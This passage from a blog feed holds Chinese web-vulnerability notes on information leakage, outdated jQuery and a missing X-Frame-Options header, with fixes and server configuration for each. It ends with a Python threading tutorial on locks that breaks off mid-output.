        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：测试文件</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者读取测试文件信息，可能进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>删除或者限制访问测试文件。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> 测试文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】敏感文件</title>
      <link href="//191123-174558.html"/>
      <url>//191123-174558.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感文件</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。</p><p>Web应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p><p>攻击者可能通过文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对网站错误信息进行统一返回，模糊化处理；对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p><p>修改复杂的文件名称；从站点中除去不需要的文件。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://ninjia.gitbook.io/secskill/web/info">https://ninjia.gitbook.io/secskill/web/info</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> 敏感文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】敏感目录</title>
      <link href="//191123-174550.html"/>
      <url>//191123-174550.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感目录</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。</p><p>Web应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果这些名称敏感的目录中包含了危险的功能或信息，恶意攻击者有可能利用这些脚本或信息直接获取目标服务器的控制权或基于这些信息实施进一步的攻击。</p><p>知道目录之后，攻击者便可能获得目录下边的文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>如果这些目录中包含了敏感内容，可以使用非常规的目录名称，如果能删除也可以删除或者正确设置权限，禁止用户访问。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions">https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> 敏感目录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】基于HTTP连接的登录请求</title>
      <link href="//191121-220054.html"/>
      <url>//191121-220054.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：基于HTTP连接的登录请求</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能被同一个局域网内的攻击者嗅探到用户输入的登录数据，如账号和密码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>在提交登录请求数据前加密请求数据或使用HTTPS连接发送登录请求数据。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://blog.csdn.net/CHS007chs/article/details/52524322">https://blog.csdn.net/CHS007chs/article/details/52524322</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】jQuery跨站脚本</title>
      <link href="//191120-214129.html"/>
      <url>//191120-214129.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：jQuery跨站脚本</p><p>风险等级：低危</p><p>问题类型：使用已知漏洞的组件</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。</p><a id="more"></a><p>漏洞原理：jQuery中过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 location.hash跨站漏洞</p><p>影响版本：</p><p>jquery-1.7.1~1.8.3</p><p>jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p><p>jquery-1.2~1.5</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>jQuery 1.4.2版本中，远程攻击者可利用该漏洞向页面中注入任意的HTML。</p><p>jQuery 1.6.3之前版本中，当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。</p><p>jQuery 3.0.0之前版本中，攻击者可利用该漏洞执行客户端代码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href="https://jquery.com/">https://jquery.com/</a></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="http://www.word666.com/wangluo/121052.html">http://www.word666.com/wangluo/121052.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/89811603">https://blog.csdn.net/qq_36119192/article/details/89811603</a><br><a href="https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html">https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
            <tag> XSS </tag>
            
            <tag> 漏洞笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】X-Frame-Options Header未配置</title>
      <link href="//191119-144643.html"/>
      <url>//191119-144643.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：X-Frame-Options Header未配置</p><p>风险等级：低危</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;忽略frame&gt;,&lt;忽略iframe&gt;,&lt;忽略embed&gt;或者&lt;忽略object&gt;中展现的标记。</p><p>网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。</p><p>X-Frame-Options有三个值：</p><a id="more"></a><h3 id="deny"><a href="#deny" class="headerlink" title="deny"></a>deny</h3><p>表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</p><h3 id="sameorigin"><a href="#sameorigin" class="headerlink" title="sameorigin"></a>sameorigin</h3><p>表示该页面可以在相同域名页面的 frame 中展示。</p><h3 id="allow-from-uri"><a href="#allow-from-uri" class="headerlink" title="allow-from uri"></a>allow-from uri</h3><p>表示该页面可以在指定来源的 frame 中展示。</p><p>换一句话说，如果设置为DENY，不光在别人的网站frame嵌入时会无法加载，在同域名页面中同样会无法加载。</p><p>另一方面，如果设置为SAMEORIGIN，那么页面就可以在同域名页面的frame中嵌套。正常情况下我们通常使用SAMEORIGIN参数。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。</p><p>也就是说网站内容可能被其他站点引用，可能遭受到点击劫持攻击。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h3 id="配置-Apache"><a href="#配置-Apache" class="headerlink" title="配置 Apache"></a>配置 Apache</h3><p>配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 ‘site’ 的配置中:</p><pre class="line-numbers language-none"><code class="language-none">Header always set X-Frame-Options &quot;sameorigin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要将 Apache 的配置 X-Frame-Options 设置成 deny , 按如下配置去设置你的站点：</p><pre class="line-numbers language-none"><code class="language-none">Header set X-Frame-Options &quot;deny&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要将 Apache 的配置 X-Frame-Options 设置成 allow-from，在配置里添加：</p><pre class="line-numbers language-none"><code class="language-none">Header set X-Frame-Options &quot;allow-from https:&#x2F;&#x2F;example.com&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置-nginx配置"><a href="#配置-nginx配置" class="headerlink" title="配置 nginx配置"></a>配置 nginx配置</h3><p>nginx 发送 X-Frame-Options 响应头，把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’ 的配置中:</p><pre class="line-numbers language-none"><code class="language-none">add_header X-Frame-Options sameorigin always;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置-IIS配置"><a href="#配置-IIS配置" class="headerlink" title="配置 IIS配置"></a>配置 IIS配置</h3><p>IIS 发送 X-Frame-Options 响应头，添加下面的配置到 Web.config 文件中：</p><pre class="line-numbers language-none"><code class="language-none">&lt;system.webServer&gt;  ...  &lt;httpProtocol&gt;    &lt;customHeaders&gt;      &lt;add name&#x3D;&quot;X-Frame-Options&quot; value&#x3D;&quot;sameorigin&quot; &#x2F;&gt;    &lt;&#x2F;customHeaders&gt;  &lt;&#x2F;httpProtocol&gt;  ...&lt;&#x2F;system.webServer&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置-HAProxy"><a href="#配置-HAProxy" class="headerlink" title="配置 HAProxy"></a>配置 HAProxy</h3><p>配置 HAProxy 发送 X-Frame-Options 头，添加这些到你的前端、监听 listen，或者后端的配置里面：</p><pre class="line-numbers language-none"><code class="language-none">rspadd X-Frame-Options:\ sameorigin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者，在更加新的版本中：</p><pre class="line-numbers language-none"><code class="language-none">http-response set-header X-Frame-Options sameorigin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置-Express"><a href="#配置-Express" class="headerlink" title="配置 Express"></a>配置 Express</h3><p>要配置 Express 可以发送 X-Frame-Options header，你可以用借助了 frameguard 来设置头部的 helmet。在你的服务器配置里面添加：</p><pre class="line-numbers language-none"><code class="language-none">const helmet &#x3D; require(&#39;helmet&#39;);const app &#x3D; express();app.use(helmet.frameguard(&#123; action: &quot;sameorigin&quot; &#125;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者，你也可以直接用 frameguard：</p><pre class="line-numbers language-none"><code class="language-none">const frameguard &#x3D; require(&#39;frameguard&#39;)app.use(frameguard(&#123; action: &#39;sameorigin&#39; &#125;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://blog.whsir.com/post-3919.html">https://blog.whsir.com/post-3919.html</a><br><a href="https://blog.csdn.net/qq_25934401/article/details/81384876">https://blog.csdn.net/qq_25934401/article/details/81384876</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> X-Frame-Options </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】6、锁lock</title>
      <link href="//191105-121011.html"/>
      <url>//191105-121011.html</url>
      
        <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><p><a href="https://www.teamssix.com/year/191104-101112.html">5、不一定有效率GIL</a></p><h1 id="0x00-关于线程锁lock"><a href="#0x00-关于线程锁lock" class="headerlink" title="0x00 关于线程锁lock"></a>0x00 关于线程锁lock</h1><p>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p><p>而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。</p><a id="more"></a><h1 id="0x01-不使用lock锁的情况"><a href="#0x01-不使用lock锁的情况" class="headerlink" title="0x01 不使用lock锁的情况"></a>0x01 不使用lock锁的情况</h1><p>job1：全局变量A的值每次加1，循环7次并打印</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">job1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 全局变量A的值每次加1，循环7次并打印</span>   <span class="token keyword">global</span> A   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job1'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>job2：全局变量A的值每次加10，循环7次并打印</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">job2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 全局变量A的值每次加10，循环7次并打印</span>   <span class="token keyword">global</span> A   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">10</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job2'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main：定义两个线程并执行job1和job2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义两个线程并执行job1和job2</span>   t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job1<span class="token punctuation">)</span>   t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job2<span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">job1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 全局变量A的值每次加1，循环7次并打印</span>   <span class="token keyword">global</span> A   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job1'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">job2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 全局变量A的值每次加10，循环7次并打印</span>   <span class="token keyword">global</span> A   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">10</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job2'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义两个线程并执行job1和job2</span>   t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job1<span class="token punctuation">)</span>   t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job2<span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   A <span class="token operator">=</span> <span class="token number">0</span>   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 6_lock.py</span>job1 <span class="token number">1</span>job1 <span class="token number">2</span>job1 <span class="token number">3</span>job1 <span class="token number">4</span>job1 5job2 <span class="token number">15</span>job2 job1 <span class="token number">2625</span>job2job1 <span class="token number">36</span> <span class="token number">37</span>job2 <span class="token number">47</span>job2 <span class="token number">57</span>job2 <span class="token number">67</span>job2 <span class="token number">77</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到不使用lock的时候，打印的结果很混乱。</p><h1 id="0x02-使用lock的情况"><a href="#0x02-使用lock的情况" class="headerlink" title="0x02 使用lock的情况"></a>0x02 使用lock的情况</h1><p>使用lock的方法是， 在每个线程执行运算修改共享内存之前，执行lock.acquire()将共享内存上锁， 确保当前线程执行时，内存不会被其他线程访问，执行运算完毕后，使用lock.release()将锁打开， 保证其他的线程可以使用该共享内存。</p><p>为job1和job2加锁：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">job1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 全局变量A的值每次加1，循环7次并打印</span>   <span class="token keyword">global</span> A<span class="token punctuation">,</span>lock   lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 上锁</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job1'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span>   lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开锁</span><span class="token keyword">def</span> <span class="token function">job2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 全局变量A的值每次加10，循环7次并打印</span>   <span class="token keyword">global</span> A<span class="token punctuation">,</span>lock   lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 上锁</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">10</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job2'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span>   lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开锁</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在程序入口处定义一个lock</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>   A <span class="token operator">=</span> <span class="token number">0</span>   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">job1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 全局变量A的值每次加1，循环7次并打印</span>   <span class="token keyword">global</span> A<span class="token punctuation">,</span>lock   lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job1'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span>   lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">job2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 全局变量A的值每次加10，循环7次并打印</span>   <span class="token keyword">global</span> A<span class="token punctuation">,</span>lock   lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      A <span class="token operator">+=</span> <span class="token number">10</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'job2'</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span>   lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义两个线程并执行job1和job2</span>   t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job1<span class="token punctuation">)</span>   t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job2<span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>   t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>   t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>   A <span class="token operator">=</span> <span class="token number">0</span>   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 6_lock.py</span>job1 <span class="token number">1</span>job1 <span class="token number">2</span>job1 <span class="token number">3</span>job1 <span class="token number">4</span>job1 <span class="token number">5</span>job1 <span class="token number">6</span>job1 <span class="token number">7</span>job2 <span class="token number">17</span>job2 <span class="token number">27</span>job2 <span class="token number">37</span>job2 <span class="token number">47</span>job2 <span class="token 